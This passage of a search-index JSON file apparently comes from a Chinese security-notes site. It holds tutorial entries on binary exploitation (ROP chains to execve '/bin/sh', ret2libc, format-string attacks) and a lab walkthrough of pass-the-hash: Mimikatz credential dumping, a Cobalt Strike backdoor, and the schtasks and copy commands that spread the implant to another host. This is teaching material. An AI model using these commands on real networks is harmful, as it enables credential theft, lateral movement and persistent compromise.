\u7ed5\u8fc7\u65b9\u6cd5ROP\uff0c\u7528\u5df2\u6709\u7684\u7247\u6bb5\u6784\u5efaROP\u94fe\u5b50\uff08\u7528\u4f60\u672c\u8eab\u4ee3\u7801\u6267\u884c\uff0c\u6211\u4e0d\u53bb\u5199\u4e86\uff09","title":"NX"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#aslr","text":"\u7a7a\u95f4\u5730\u5740\u968f\u673a\u5316\uff1a\u6bcf\u6b21\u6267\u884c\u7a0b\u5e8f\u65f6stack\u3001heap\u3001library\u7684\u5730\u5740\u90fd\u4e0d\u4e00\u6837\uff08\u57fa\u5740\u4e0d\u540c\uff0c\u504f\u79fb\u4e00\u81f4\uff09","title":"ASLR"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#pie","text":"\u5f00\u542f\u540ecode\u6bb5\u548cdata\u6bb5\uff08text\u6bb5\uff09\u4e5f\u4f1a\u542f\u7528ASLR IDA\u6253\u5f00\u53d1\u73b0text\u6bb5\uff08\u4ee3\u7801\u6bb5\uff09\u524d\u9762\u53ea\u80fd\u663e\u793a\u540e3\u4f4d\uff08\u504f\u79fb\uff09\uff0c\u524d\u9762\u90fd\u662f0","title":"PIE"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#relro","text":"checksec\u7684\u7ed3\u679c\uff1a FULL RELRO\u8868\u793a\u6539\u4e0d\u4e86got\u8868 Partial RELRO\u8868\u660e\u542f\u7528\u4e86\u61d2\u52a0\u8f7dLazy Binding\uff0c\u53ef\u4ee5\u6539got\u8868","title":"RELRO"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#got-hijack","text":"","title":"GOT Hijack"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#lazy-binding","text":"\u6240\u6709\u7684lib\u4e0d\u4f1a\u5168\u90fd\u8c03\u7528\uff0c\u53ea\u6709\u521d\u6b21\u4f7f\u7528\u65f6\u624d\u4f1a\u52a0\u8f7d\uff08\u628a\u9700\u8981\u8c03\u7528\u7684\u5e93\u51fd\u6570\u5730\u5740\u5199\u5165GOT\u8868\uff09 \u8bf4\u660e\u5f00\u542fLazy Binding\u65f6GOT\u8868\u662f\u53ef\u5199\u7684\uff0c\u90a3\u4e48\u6211\u4eec\u540e\u671f\u4e5f\u53ef\u4ee5\u4fee\u6539GOT\u8868\u7684\u503c\uff0c\u8ba9\u8be5\u51fd\u6570\u6307\u5411\u5176\u4ed6\u5730\u65b9 \u4e5f\u53ef\u4ee5\u4fee\u6539GOT\u6307\u5411\u5730\u5740\u7684\u5185\u5bb9\uff0c\u672c\u8d28\u4e0a\u662f\u66ff\u6362\u51fd\u6570\u7684\u5185\u5bb9 GOT\u8868\u96c6\u4e2d\u5b58\u50a8\u4e86**\u6bcf\u4e2a\u51fd\u6570\u7684\u771f\u5b9e\u5730\u5740**","title":"Lazy Binding \u61d2\u52a0\u8f7d"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#rop","text":"\u901a\u8fc7\u4e0d\u65ad\u53bb\u6267\u884c\u5305\u542bret\u7684\u7a0b\u5e8f\u6c47\u7f16\u7247\u6bb5\u6765\u8fbe\u5230\u60f3\u8981\u7684\u5bc4\u5b58\u5668\u64cd\u4f5c \u8fd9\u4e9b\u5305\u542bret\u7684\u6c47\u7f16\u7a0b\u5e8f\u7247\u6bb5\u53eb\u505agadget \u7531\u4f17\u591a\u7684ROP gadget\u4e32\u6210ROP Chain\u6765\u4f5c\u4e3a\u6211\u4eec\u7684shellcode 4004fa: 48 83 c4 08 add rsp, 0x8 4004fe: c3 ret 4005b8: 5d pop rbp 4005b9: c3 ret 4006c4: c9 leave 4006c5: c3 ret 400730: 41 5e pop r14 400732: 41 5f pop r15 400734: c3 ret \u6b64\u65f6\u6211\u4eec\u5f80\u6808\u4e0a\u4ece\u4e0a\u5f80\u4e0b\u586b\u5145\u6570\u636e\u65f6\u9700\u8981\u4f9d\u6b21\u5199\u5165\u8df3\u8f6c\u5730\u5740\uff0c\u8fdb\u5165\u7247\u6bb5\u6267\u884c\u5b8cgadget\u540e\u4f1a\u81ea\u52a8\u8df3\u56de\u5230\u4e3b\u51fd\u6570 4004fa 4005b8 4006c4 400730 ...... \u6700\u7ec8\u6784\u9020\u51faexecve\u51fd\u6570(0x3b) pop rdi\uff0c\u628a\u6808\u9876\u7684\u503c\u8d4b\u7ed9rdi\uff0c\u6b64\u65f6rdi=0x6bb2e0\uff0c\u521a\u597d\u662fbss\u6bb5\u5730\u5740 pop rsi\uff0c\u628a\u6808\u9876\u7684\u503c\uff08 /bin/sh\\x00 \u7684\u6307\u9488\u5730\u5740\uff09\u8d4b\u7ed9rsi mov qword ptr [rdi], rsi\uff0c\u628arsi\u7684\u503c\u79fb\u52a8\u5230rdi\u6307\u9488\u6240\u6307\u5411\u7684\u4f4d\u7f6e\uff0c\u4e5f\u5c31\u662f\u628a /bin/sh\\x00 \u5199\u5165bss\u4e2d pop rsi\uff0c\u628arsi\u8d4b\u503c\u4e3a0 pop rdx\uff0c\u628ardx\u8d4b\u503c\u4e3a0 pop rax\uff0c\u628arax\u8d4b\u503c\u4e3a0x3b syscall\uff0c\u6b64\u65f6rax\u662f0x3b\uff0c\u4e5f\u5c31\u662f\u6267\u884c\u4e86execve\u51fd\u6570\uff0c\u5404\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\u4e4b\u524d\u4e5f\u94fa\u57ab\u597d\u4e86","title":"ROP"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#return-to-plt","text":"\u4f9d\u65e7\u662fROP\uff0c\u53ea\u4e0d\u8fc7\u8fd9\u6b21\u9700\u8981\u6784\u9020 system(\"sh\"); \u51fd\u6570\u3002 \u8981\u83b7\u5f97shell\u9700\u8981\u505a\u5982\u4e0b\u6b65\u9aa4\uff1a \u83b7\u53d6system\u51fd\u6570\u7684\u5730\u5740\u3002 \u83b7\u53d6\u201c/bin/sh\u201d\u5b57\u7b26\u4e32\u7684\u5730\u5740\u3002 \u5c06RDI\u4e2d\u7684\u503c\uff0c\u6539\u6210\u201c/bin/sh\u201d\u5b57\u7b26\u4e32\u7684\u5730\u5740\u3002 **\u5168\u5c40\u504f\u79fb\u8868\uff08GOT\uff09**\u5305\u542b\u6bcf\u4e2a\u5168\u5c40\u53d8\u91cf\u76844\u5b57\u8282\u6761\u76ee\uff0c\u5176\u4e2d4\u5b57\u8282\u6761\u76ee\u5305\u542b\u5168\u5c40\u53d8\u91cf\u7684\u5730\u5740\u3002 **\u8fc7\u7a0b\u94fe\u63a5\u8868\uff08PLT\uff09**\u5305\u542b\u6bcf\u4e2a\u5168\u5c40\u51fd\u6570\u7684\u5b58\u6839\u4ee3\u7801\u3002\u4ee3\u7801\u6bb5\u4e2d\u7684\u8c03\u7528\u6307\u4ee4\u4e0d\u76f4\u63a5\u8c03\u7528\u51fd\u6570\uff08'function'\uff09\uff0c\u800c\u662f\u8c03\u7528\u5b58\u6839\u4ee3\u7801\uff08function@PLT\uff09\u3002 \u539f\u7406\uff1a \u7528ida\u53cd\u7f16\u8bd1\u76ee\u6807\u7a0b\u5e8f\u540e\u53d1\u73b0\u5176\u4e2d\u6709printf,gets ,setvbuf\uff0c\u5728\u5185\u5b58\u8fd9\u51e0\u4e2a\u51fd\u6570\u7684got\u8868\u5730\u5740\u662f\u56fa\u5b9a\u7684\u3002 \u5728\u6267\u884cprintf\u51fd\u6570\u524d\uff0cedi\u6307\u5411\u7684\u662f\u683c\u5f0f\u5316\u4e32\uff0crsi\u6307\u5411\u7684\u662f\u88ab\u6253\u5370\u4e32\u7684\u5730\u5740\u3002 \u5982\u679c\u63a7\u5236\u4e86rsi\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6253\u5370\u4efb\u4f55\u5730\u5740\u7684\u5185\u5bb9\u3002 \u7136\u540e\u901a\u8fc7\u5f53\u524d\u51fd\u6570\u5730\u5740(gets) - system = \u504f\u79fb\u5730\u5740 (\u4e24\u4e2a\u51fd\u6570\u7684\u76f8\u5bf9\u504f\u79fb\u662f\u56fa\u5b9a\u7684)\uff0c\u5f97\u5230\u4e00\u4e2a\u56fa\u5b9a\u7684\u76f8\u5bf9\u504f\u79fb\u5730\u5740\u3002 \u5f97\u5230\u504f\u79fb\u5730\u5740\u540e\u901a\u8fc7\u5f53\u524d\u5730\u5740\u52a0\u4e0a\u504f\u79fb\u5f97\u5230system\u51fd\u6570\u7684\u5185\u5b58\u5730\u5740\uff0c\u7136\u540e\u4f20\u5165\u2019/bin/sh\u2019\uff0c\u6267\u884csystem\u5c31\u8fbe\u5230\u76ee\u7684\u3002","title":"Return to PLT"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#return-to-libc","text":"\u901a\u8fc7 ROPgadget --binary ./gothijack | grep \"pop rax\" \u53d1\u73b0\uff0c\u81ea\u5df1\u5199\u7684\u4ee3\u7801\u6ca1\u6709\u6240\u9700\u8981\u540e\u9762\u7d27\u8ddf\u7740ret\u7684gadget\uff0c\u4e5f\u5c31\u65e0\u6cd5\u6784\u9020ROP\u3002 \u7136\u800clibc\u4e2d\u4ee3\u7801\u975e\u5e38\u591a\uff0c\u6240\u9700\u8981\u7684\u7247\u6bb5\uff08execve\u6216\u8005system\u51fd\u6570\uff09\u901a\u5e38\u90fd\u80fd\u641c\u5230\u3002 \u6240\u6709\u7248\u672c\u7684libc\u53ef\u4ee5\u5728\u8fd9\u91cc\u627e\u5230 libc database search \u6839\u636eputs\u51fd\u6570\u7684\u5730\u5740\u548c\u504f\u79fb\uff0c\u8ba1\u7b97\u51falibc\u57fa\u5740\uff0c\u518d\u6839\u636esystem\u51fd\u6570\u7684\u504f\u79fb\uff0c\u8ba1\u7b97\u51fasystem\u51fd\u6570\u7684\u5730\u5740\u3002 \u83b7\u5f97libc\u5730\u5740\u7684\u5730\u65b9\u6709\uff1a\u6808\u3001\u5806\u3001got\uff0c\u6808\u4e2d\u5b58\u7740\u51fd\u6570\u7684\u771f\u5b9e\u5730\u5740\uff0c\u504f\u79fb\u901a\u8fc7libc\u53ef\u4ee5\u76f4\u63a5\u83b7\u5f97\uff0c\u57fa\u5740\u5c31\u6709\u4e86\u3002","title":"Return to libc"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#_9","text":"","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#_10","text":"\u51fd\u6570 \u57fa\u672c\u4ecb\u7ecd printf \u8f93\u51fa\u5230stdout\u8f93\u5165 fprintf \u8f93\u51fa\u5230\u6307\u5b9aFILE\u6d41 vprintf \u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u5230stdout vfprintf \u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u5230\u6307\u5b9aFILE\u6d41 sprintf \u8f93\u51fa\u5230\u5b57\u7b26\u4e32 snprintf \u8f93\u51fa\u6307\u5b9a\u5b57\u8282\u6570\u5230\u5b57\u7b26\u4e32 vsprintf \u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u5230\u5b57\u7b26\u4e32 vsnprintf \u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u6307\u5b9a\u5b57\u8282\u5230\u5b57\u7b26\u4e32 setproctitle \u8bbe\u7f6eargv","title":"\u5e38\u89c1\u51fd\u6570"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#_11","text":"\u4ee5 printf \u4e3a\u4f8b\uff0c\u51fd\u6570\u4f1a\u4e00\u4e2a\u4e00\u4e2a\u8bfb\u53d6\u53c2\u6570\u3002\u5f53\u524d\u5b57\u7b26\u4e0d\u662f%\uff0c\u76f4\u63a5\u8f93\u51fa\u5230\u76f8\u5e94\u7684\u6807\u51c6\u8f93\u51fa \u82e5\u5f53\u524d\u5b57\u7b26\u662f%\uff0c\u7ee7\u7eed\u8bfb\u53d6\u4e0b\u4e00\u4e2a\u5b57\u7b26\uff1a \u5982\u679c\u6ca1\u6709\u5b57\u7b26\uff0c\u62a5\u9519 \u5982\u679c\u4e0b\u4e00\u4e2a\u5b57\u7b26\u662f%\uff0c\u8f93\u51fa% \u5426\u5219\u6839\u636e\u76f8\u5e94\u7684\u5b57\u7b26\uff0c\u83b7\u53d6\u76f8\u5e94\u7684\u53c2\u6570\uff0c\u5e76\u5bf9\u5176\u8fdb\u884c\u89e3\u6790\u5e76\u8f93\u51fa printf ( \"Color %s, Number %d, Float %4.2f\" ); \u5176\u4e2d\uff1a %s \u8f93\u51fa\u5730\u5740\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\uff0c\u82e5\u5730\u5740\u5bf9\u5e94\u7a7a\u95f4\u4e0d\u5408\u6cd5\u5c31\u4f1a\u5d29\u6e83 %d \u8f93\u51fa\u5185\u5bb9\u5bf9\u5e94\u7684\u6574\u578b\u503c %4.2f \u8f93\u51fa\u5185\u5bb9\u5bf9\u5e94\u7684\u6d6e\u70b9\u503c \u8865\u5145\uff1a %d \u6216\u8005 %i \uff0c\u6709\u7b26\u53f7\u6574\u6570 %u \uff0c\u65e0\u7b26\u53f7\u6574\u6570 %x \u6216\u8005 %X \uff0c16\u8fdb\u5236\u65e0\u7b26\u53f7\u6574\u5f62\uff0c\u5c0fx\u8f93\u51fa\u5c0f\u5199\u768416\u8fdb\u5236\uff0c\u5927X\u8f93\u51fa\u5927\u5199\u768416\u8fdb\u5236 %o \uff0c8\u8fdb\u5236\u65e0\u7b26\u53f7\u6574\u5f62 %c \uff0c\u8f93\u51fa\u4e00\u4e2a\u5b57\u7b26 %p \uff0c\u540e\u8ddf &a \u8f93\u51fa\u5bf9\u5e94\u53d8\u91cf\u7684\u5730\u5740 %n \uff0c\u5199\u5165\u5b57\u7b26\u4e2a\u6570","title":"\u6f0f\u6d1e\u539f\u7406"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#_12","text":"","title":"\u6cc4\u9732\u5185\u5b58"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#_13","text":"\u4f7f\u7528 %x \u3001 %p \u6765\u83b7\u53d6\u5bf9\u5e94\u6808\u7684\u5185\u5b58 \u4f7f\u7528 %s \u83b7\u53d6\u53d8\u91cf\u6240\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9 \u4f7f\u7528 %order$x \u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u7684\u503c\uff08order\u4e3a\u6808\u5185\u504f\u79fb\uff09 \u4f7f\u7528 %order$s \u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u5bf9\u5e94\u5730\u5740\u7684\u503c\uff08order\u4e3a\u6808\u5185\u504f\u79fb\uff09","title":"\u6cc4\u9732\u6808\u5185\u5185\u5b58"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#_14","text":"\u5047\u8bbe\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f8\u5bf9\u51fd\u6570\u8c03\u7528\u7b2ck\u4e2a\u53c2\u6570\uff0c\u90a3\u4e48\u53ef\u4ee5\u901a\u8fc7 addr%k$s \u6765\u83b7\u53d6\u67d0\u4e2a\u6307\u5b9a\u5730\u5740addr\u7684\u5185\u5bb9","title":"\u6cc4\u9732\u4efb\u610f\u5185\u5b58"},{"location":"%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/PWN%E5%85%A5%E9%97%A8/#_15","text":"%n \u628a\u5df2\u7ecf\u6210\u529f\u8f93\u51fa\u7684**\u5b57\u7b26\u4e2a\u6570** \u5199\u5165 \u5bf9\u5e94\u7684\u6574\u5f62\u6307\u9488\u6240\u6307\u7684\u53d8\u91cf\uff0c\u683c\u5f0f\u4e3a\uff1a [\u586b\u5145\u5185\u5bb9][\u9700\u8981\u8986\u76d6\u7684\u5730\u5740][\u586b\u5145\u5185\u5bb9]%[\u6240\u8986\u76d6\u5730\u5740\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7b2c\u51e0\u4e2a\u53c2\u6570]$n","title":"\u8986\u76d6\u5185\u5b58"},{"location":"%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/PTH%E4%BC%A0%E9%80%92%E8%87%B3cs%E4%B8%8A%E7%BA%BF/","text":"PTH\u4f20\u9012\u653b\u51fb \u00b6 Windows\u5bc6\u7801\u5982\u4f55\u5b58\u50a8 \u00b6 SAM\u6587\u4ef6 \u00b6 Windows\u5bc6\u7801\u52a0\u5bc6\u540e\u5b58\u50a8\u5728\u672c\u5730\u7684SAM\u6587\u4ef6\u4e2d\uff0c\u5728\u767b\u5f55Windows\u65f6\u7cfb\u7edf\u5c06\u7528\u6237\u8f93\u5165\u7684\u5bc6\u7801\u54c8\u5e0c\u540e\u4e0eSAM\u5b58\u50a8\u7684\u503c\u8fdb\u884c\u6bd4\u8f83\uff0c\u82e5\u76f8\u540c\u5219\u767b\u9646\u6210\u529f\u3002 SAM\u6587\u4ef6\u4f4d\u4e8e %SystemRoot%\\system32\\config\\ \u76ee\u5f55\u4e0b\uff0c\u901a\u5e38\u4e3a C:\\Windows\\System32\\config \u5982\u4f55\u8ba4\u8bc1 \u00b6 \u9501\u5c4f\u754c\u9762\u8fd0\u884c\u7684\u662fwinlogon.exe\uff0c\u8f93\u5165\u5b8c\u7528\u6237\u540d\u5bc6\u7801\u540e\uff0c\u4f20\u9012\u5230\u8fdb\u7a0b lsass.exe \u8fdb\u884c LM \u6216 NTLM \u54c8\u5e0c\u5e76\u4e0eSAM\u6587\u4ef6\u6bd4\u8f83\uff0c\u6b63\u786e\u7684\u8bdd\u5c31\u4f1a\u518d\u8f6c\u53d1\u7ed9winlogon.exe\u767b\u5f55 lsass.exe\u529f\u80fd\uff0c\u4e00\u662f\u4e0eSAM\u8fdb\u884c\u54c8\u5e0c\u5bf9\u6bd4\uff0c\u4e8c\u662f==\u5728\u5185\u5b58\u4e2d\u4fdd\u5b58\u4e00\u4efd\u660e\u6587\u5bc6\u7801== \u6240\u4ee5\u8bfb\u5bc6\u7801\u6709\u4e24\u4e2a\u65b9\u6848\uff1a \u8bfbSAM\u7684\u5bc6\u7801\u7136\u540e\u89e3\u54c8\u5e0c \u76f4\u63a5\u8bfblsass.exe\u5728\u5185\u5b58\u4e2d\u660e\u6587\u5bc6\u7801\uff08mimikatz\uff09 LM\u548cNTLM\u54c8\u5e0c\u4ecb\u7ecd \u00b6 \u5728Windows\u4e2dHash\u7684\u7ed3\u6784\u901a\u5e38\u5982\u4e0b\uff1a username:RID:LM-HASH:NT-HASH LM\u54c8\u5e0c \u00b6 \u660e\u6587\u5bc6\u7801\uff1a Admin@123 1\u3001\u5c06\u660e\u6587\u53e3\u4ee4\u8f6c\u4e3a\u5927\u5199 ADMIN@123 2\u3001\u5c06\u5b57\u7b26\u4e32\u5927\u5199\u540e\u8f6c\u4e3a16\u8fdb\u5236\uff08CTF-Tools Str->Hex\uff09 41444d494e40313233 3\u3001\u5bc6\u7801\u4e0d\u8db314\u5b57\u8282\u75280\u4e0d\u5168 41 44 4d 49 4e 40 31 32 33 9\u4e2a\u5b57\u8282 41 44 4d 49 4e 40 31 32 33 00 00 00 00 00 14\u4e2a\u5b57\u8282 4\u3001\u5c06\u4e0a\u8ff0\u7f16\u7801\u5206\u62102\u7ec4 \u7b2c\u4e00\u7ec4\uff1a41 44 4d 49 4e 40 31 \u7b2c\u4e8c\u7ec4\uff1a32 33 00 00 00 00 00 5\u3001\u5c06\u6bcf\u4e00\u7ec47\u5b57\u8282\u7684\u5341\u516d\u8fdb\u5236\u8f6c\u6362\u4e3a\u4e8c\u8fdb\u5236\uff0c\u6bcf7bit\u4e00\u7ec4\u672b\u5c3e\u52a00\uff0c\u518d\u8f6c\u6362\u6210\u5341\u516d\u8fdb\u5236\u5f97\u52302\u7ec48\u5b57\u8282\u7684\u7f16\u7801\uff08\u4ee5\u7b2c\u4e00\u7ec4\u4e3a\u4f8b\uff09 \u7b2c\u4e00\u7ec4\uff1a 41444d494e4031 \u5148\u8f6c\u4e3a\u4e8c\u8fdb\u5236\uff08\u8ba1\u7b97\u5668\uff09 01000001010001000100110101001001010011100100000000110001 \u6bcf7\u4e2abit\u4e00\u7ec4 0100000 1010001 0001001 1010100 1001010 0111001 0000000 0110001 \u540e\u9762\u52a00 01000000 10100010 00010010 10101000 10010100 01110010 00000000 01100010 \u518d\u8f6c\u53d8\u4e3a16\u8fdb\u5236\uff08\u8ba1\u7b97\u5668\uff09 \u7b2c\u4e00\u7ec4\uff1a 0100000010100010000100101010100010010100011100100000000001100010 \u8f6c\u4e3a16\u8fdb\u5236 40A212A894720062 \u540c\u7406\u7b2c\u4e8c\u7ec4\u5f97\u5230\uff1a3218C00000000000 6\u3001\u5c06\u4ee5\u4e0a\u6b65\u9aa4\u5f97\u5230\u7684\u4e24\u7ec48\u5b57\u8282\u7f16\u7801\uff0c\u5206\u522b\u4f5c\u4e3aDES\u52a0\u5bc6\u7684key\u6765\u52a0\u5bc6\u9b54\u672f\u5b57\u7b26\u4e32 KGS!@#$% \u9700\u8981\u5168\u90e8\u8f6c\u6362\u4e3a\u5341\u516d\u8fdb\u5236\u8fd0\u7b97 \u5f97\u5230\u52a0\u5bc6\u7ed3\u679c\uff1a \u7b2c\u4e00\u7ec4\uff1a6F08D7B306B1DAD4 \u7b2c\u4e8c\u7ec4\uff1aB75E0C8D76954A50 7\u3001\u5408\u5e76\u4e24\u7ec4\u6570\u636e\uff0c\u6700\u7ec8\u7ed3\u679c\u5c31\u662fLM Hash 6F08D7B306B1DAD4B75E0C8D76954A50 NTLM\u54c8\u5e0c \u00b6 \u660e\u6587\u5bc6\u7801\uff1a Admin@123 1\u3001\u5c06\u660e\u6587\u53e3\u4ee4\u8f6c\u6362\u4e3a16\u8fdb\u5236 41646d696e40313233 2\u3001\u8f6c\u6362\u4e3aunicode\u683c\u5f0f\uff08\u6bcf\u5b57\u8282\u540e\u8865\u4fe90\uff09 410064006d0069006e004000310032003300 3\u3001\u5bf9Unicode\u5b57\u7b26\u4e32\u505aMD4\u52a0\u5bc6\uff08\u5c0f\u751f->HashCalc\uff09 570a9a65db8fba761c1008a51d4c95ab 4\u3001\u5f97\u5230\u7684\u5bc6\u6587\u5c31\u662fNTLM Hash Mimikatz\u6293\u53d6\u5bc6\u7801 \u00b6 1\u3001\u76f4\u63a5\u6293\u53d6SAM\u6587\u4ef6\u5bc6\u7801 2\u3001\u53bblsass\u8fdb\u7a0b\u6293\u53d6\u660e\u6587\u5bc6\u7801\uff08winserver2012\u4ee5\u540e\u5931\u6548\uff09 cs\u5b9e\u9a8c\u6a21\u62df \u00b6 \u542f\u52a8cs \u00b6 vps\u542f\u52a8cs4.1\uff0c\u8fd0\u884c cd cs4.1/ bash teamserver vpsip 12345 ( \u8fde\u63a5\u5bc6\u7801 ) \u672c\u5730window\u8fd0\u884c cobaltstrikeCN.vbs \u8f93\u5165\u4e3b\u673aIP\uff0c\u7aef\u53e39081\uff0c\u7528\u6237\u540d\u548c\u5bc6\u7801 \u8fde\u63a5\u6210\u529f\uff01 \u62ff\u4e0b\u4e00\u53f0\u5185\u7f51\u9776\u673a \u00b6 \u4e0b\u4e00\u6b65\u751f\u6210exe\u540e\u95e8\u6728\u9a6c\uff1a\u70b9\u51fb\u653b\u51fb->\u751f\u6210\u540e\u95e8->Windows Executable\uff0c\u76d1\u542c\u5668\u9009\u62e9http\u5373\u53ef \u653e\u5230\u4e00\u53f0\u6a21\u62df\u5185\u7f51\u865a\u62df\u673a\u4e0a\u8fd0\u884c\uff0ccs\u6210\u529f\u4e0a\u7ebf\u4e00\u53f0\u5185\u7f51\u9776\u673a192.168.41.20 \u626b\u63cf\u5185\u7f51 \u00b6 \u786e\u8ba4\u5185\u7f51\u5176\u4ed6\u5b58\u6d3b\u4e3b\u673a cs\u4e3b\u673a\u53f3\u952e->\u76ee\u6807->\u7aef\u53e3\u626b\u63cf \u770b\u5230\u53e6\u4e00\u53f0\u4e3b\u673a192.168.41.130\u5b58\u6d3b \u6293\u53d6\u672c\u5730\u7684\u5bc6\u7801 \u00b6 cs\u4e3b\u673a\u53f3\u952e->\u6267\u884c->Run Mimikatz \u56de\u663e\u4e86\u65e2\u6709NTLM Hash\u53c8\u6709\u660e\u6587\u5bc6\u7801 \u4e0b\u4e00\u6b65\u62ff\u7740\u8fd9\u4e2aHash\u5c1d\u8bd5\u767b\u5f55130\u8fd9\u53f0\u673a\u5668\uff0c\u5373PTH\uff08Pass The Hash\uff09 \u8fdb\u884cPTH\u653b\u51fb \u00b6 cs\u547d\u4ee4\u884c\u8f93\u5165 pth Administrator 570a9a65db8fba761c1008a51d4c95ab \u76ee\u6807\u673a\u5668cs\u4e0a\u7ebf \u00b6 1\u3001\u590d\u5236\u6728\u9a6c\u81f3\u76ee\u6807\u673a\u5668 cs\u547d\u4ee4\u884c\u8f93\u5165 shell copy c: \\u sers \\a dministrator \\d esktop \\a rtifact.exe \\\\ 192 .168.41.130 \\c $ 2\u3001\u76ee\u6807\u4e3b\u673a\u521b\u5efa\u8ba1\u5212\u4efb\u52a1 cs\u547d\u4ee4\u884c\u8f93\u5165 shell schtasks /create /s 192 .168.41.130 /tn test /sc onstart /tr c: \\a rtifact.exe /ru system /f 3\u3001\u624b\u52a8\u6267\u884c\u8ba1\u5212\u4efb\u52a1 cs\u547d\u4ee4\u884c\u8f93\u5165 shell schtasks /run /s 192 .168.41.130 /i /tn \"test\" 130\u4e3b\u673a\u6210\u529f\u4e0a\u7ebf","title":"PTH\u4f20\u9012\u653b\u51fb"},{"location":"%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/PTH%E4%BC%A0%E9%80%92%E8%87%B3cs%E4%B8%8A%E7%BA%BF/#pth","text":"","title":"PTH\u4f20\u9012\u653b\u51fb"},{"location":"%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/PTH%E4%BC%A0%E9%80%92%E8%87%B3cs%E4%B8%8A%E7%BA%BF/#windows","text":"","title":"Windows\u5bc6\u7801\u5982\u4f55\u5b58\u50a8"},{"location":"%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/PTH%E4%BC%A0%E9%80%92%E8%87%B3cs%E4%B8%8A%E7%BA%BF/#sam","text":"Windows\u5bc6\u7801\u52a0\u5bc6\u540e\u5b58\u50a8\u5728\u672c\u5730\u7684SAM\u6587\u4ef6\u4e2d\uff0c\u5728\u767b\u5f55Windows\u65f6\u7cfb\u7edf\u5c06\u7528\u6237\u8f93\u5165\u7684\u5bc6\u7801\u54c8\u5e0c\u540e\u4e0eSAM\u5b58\u50a8\u7684\u503c\u8fdb\u884c\u6bd4\u8f83\uff0c\u82e5\u76f8\u540c\u5219\u767b\u9646\u6210\u529f\u3002 SAM\u6587\u4ef6\u4f4d\u4e8e %SystemRoot%\\system32\\config\\ \u76ee\u5f55\u4e0b\uff0c\u901a\u5e38\u4e3a C:\\Windows\\System32\\config","title":"SAM\u6587\u4ef6"},{"location":"%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/PTH%E4%BC%A0%E9%80%92%E8%87%B3cs%E4%B8%8A%E7%BA%BF/#_1","text":"\u9501\u5c4f\u754c\u9762\u8fd0\u884c\u7684\u662fwinlogon.exe\uff0c\u8f93\u5165\u5b8c\u7528\u6237\u540d\u5bc6\u7801\u540e\uff0c\u4f20\u9012\u5230\u8fdb\u7a0b lsass.exe \u8fdb\u884c LM \u6216 NTLM \u54c8\u5e0c\u5e76\u4e0eSAM\u6587\u4ef6\u6bd4\u8f83\uff0c\u6b63\u786e\u7684\u8bdd\u5c31\u4f1a\u518d\u8f6c\u53d1\u7ed9winlogon.exe\u767b\u5f55 lsass.exe\u529f\u80fd\uff0c\u4e00\u662f\u4e0eSAM\u8fdb\u884c\u54c8\u5e0c\u5bf9\u6bd4\uff0c\u4e8c\u662f==\u5728\u5185\u5b58\u4e2d\u4fdd\u5b58\u4e00\u4efd\u660e\u6587\u5bc6\u7801== \u6240\u4ee5\u8bfb\u5bc6\u7801\u6709\u4e24\u4e2a\u65b9\u6848\uff1a \u8bfbSAM\u7684\u5bc6\u7801\u7136\u540e\u89e3\u54c8\u5e0c 